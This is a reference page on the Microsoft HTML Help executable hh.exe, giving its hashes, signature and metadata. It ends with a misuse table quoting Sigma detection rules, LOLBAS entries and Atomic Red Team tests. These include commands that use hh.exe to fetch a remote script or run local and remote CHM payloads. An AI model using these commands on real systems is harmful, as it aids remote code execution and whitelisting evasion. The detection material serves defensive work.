---
title: hh.exe | Microsoft HTML Help Executable
---

# hh.exe 

* File Path: `C:\Windows\hh.exe`
* Description: Microsoft HTML Help Executable
* Comments: 

## Hashes

Type | Hash
-- | --
MD5 | `1CECEE8D02A8E9B19D3A1A65C7A2B249`
SHA1 | `4B1E2F8EFBECB677080DBB26876311D9E06C5020`
SHA256 | `8AB2F9A4CA87575F03F554AEED6C5E0D7692FA9B5D420008A1521F7F7BD2D0A5`
SHA384 | `F4692DE1F5DDDAAAFAACF80D65B3CA91E37711EE1D358C2F4E29A57F650679C50B444B9BA5FAA8B279C42BD65AADB6A5`
SHA512 | `B72A87C998BFF58C72241072BCDC682CDFC2154EF054F5F95B1CE87BDA44D9E9B16D1E43F708FBDB6BF37D73F8E7789D5226BCFFB96467383A14700E6C0600D0`
SSDEEP | `192:NZ4u99dac1vr3rS3N0MwfafE06YU/Shm5GJ1KDJD/4Wcg:NZ46Mc5vSCaE0TKI1KDWWcg`

## Runtime Data

### Usage (stdout):
```Batchfile

```

### Usage (stderr):
```Batchfile

```

### Child Processes:


## Signature

* Status: Signature verified.
* Serial: `3300000266BD1580EFA75CD6D3000000000266`
* Thumbprint: `A4341B9FD50FB9964283220A36A1EF6F6FAA7840`
* Issuer: CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
* Subject: CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

## File Metadata

* Original Filename: HH.exe.mui
* Product Name: HTML Help
* Company Name: Microsoft Corporation
* File Version: 10.0.17763.1 (WinBuild.160101.0800)
* Product Version: 10.0.17763.1
* Language: English (United States)
* Legal Copyright:  Microsoft Corporation. All rights reserved.

## File Similarity (ssdeep match)

File | Score
-- | --
[C:\Windows\hh.exe](hh.exe-2C8FE78D53C8CA27523A71DFD2938241.md) | 38
[C:\Windows\hh.exe](hh.exe-52AFE6DE5E463B7A08C184B1EB49DD6A.md) | 38
[C:\WINDOWS\hh.exe](hh.exe-DF73D52FDCE65F90A2E49EFB5248C77C.md) | 71
[C:\WINDOWS\SysWOW64\hh.exe](hh.exe-1DDFACDAC1875864336F7B61A7E562C9.md) | 33
[C:\Windows\SysWOW64\hh.exe](hh.exe-25DA176935752443FE077C2F0F819B7E.md) | 33
[C:\Windows\SysWOW64\hh.exe](hh.exe-7AA22C33D8C35E6F59ADB2D02C8702C7.md) | 38
[C:\Windows\SysWOW64\hh.exe](hh.exe-A97778801ABF79482E757200E4035A01.md) | 46

## Possible Misuse

*The following table contains possible examples of `hh.exe` being misused. While `hh.exe` is **not** inherently malicious, its legitimate functionality can by abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[sigma](https://github.com/Neo23x0/sigma) | [godmode_sigma_rule.yml](https://github.com/Neo23x0/sigma/blob/master/other/godmode_sigma_rule.yml) | `            - '\hh.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_hh_chm.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_hh_chm.yml) | `title: HH.exe Execution` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_hh_chm.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_hh_chm.yml) | `description: Identifies usage of hh.exe executing recently modified .chm files.` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_hh_chm.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_hh_chm.yml) | `        Image\|endswith: '\hh.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_html_help_spawn.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_html_help_spawn.yml) | `        ParentImage: 'C:\Windows\hh.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_office_shell.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_office_shell.yml) | `            - '*\hh.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [sysmon_suspicious_remote_thread.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/sysmon/sysmon_suspicious_remote_thread.yml) | `            - '\hh.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Hh.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Hh.yml) | `Name: Hh.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Hh.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Hh.yml) | `  - Command: HH.exe http://some.url/script.ps1` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Hh.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Hh.yml) | `  - Command: HH.exe c:\windows\system32\calc.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Hh.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Hh.yml) | `    Usecase: Execute process with HH.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Hh.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Hh.yml) | `  - Path: C:\Windows\System32\hh.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Hh.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Hh.yml) | `  - Path: C:\Windows\SysWOW64\hh.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Hh.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Hh.yml) | ` - IOC: hh.exe should normally not be in use on a normal workstation` | 
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.001/T1218.001.md) | <blockquote>Adversaries may abuse Compiled HTML files (.chm) to conceal malicious code. CHM files are commonly distributed as part of the Microsoft HTML Help system. CHM files are compressed compilations of various content such as HTML documents, images, and scripting/web related programming languages such VBA, JScript, Java, and ActiveX. (Citation: Microsoft HTML Help May 2018) CHM content is displayed using underlying components of the Internet Explorer browser (Citation: Microsoft HTML Help ActiveX) loaded by the HTML Help executable program (hh.exe). (Citation: Microsoft HTML Help Executable Program) | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.001/T1218.001.md) | A custom CHM file containing embedded payloads could be delivered to a victim then triggered by [User Execution](https://attack.mitre.org/techniques/T1204). CHM execution may also bypass application whitelisting on older and/or unpatched systems that do not account for execution of binaries through hh.exe. (Citation: MsitPros CHM Aug 2017) (Citation: Microsoft CVE-2017-8625 Aug 2017)</blockquote> | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.001/T1218.001.md) | Uses hh.exe to execute a local compiled HTML Help payload. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.001/T1218.001.md) | hh.exe #{local_chm_file} | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.001/T1218.001.md) | Uses hh.exe to execute a remote compiled HTML Help payload. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.001/T1218.001.md) | hh.exe #{remote_chm_file} | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)



MIT License. Copyright (c) 2020 Strontic.


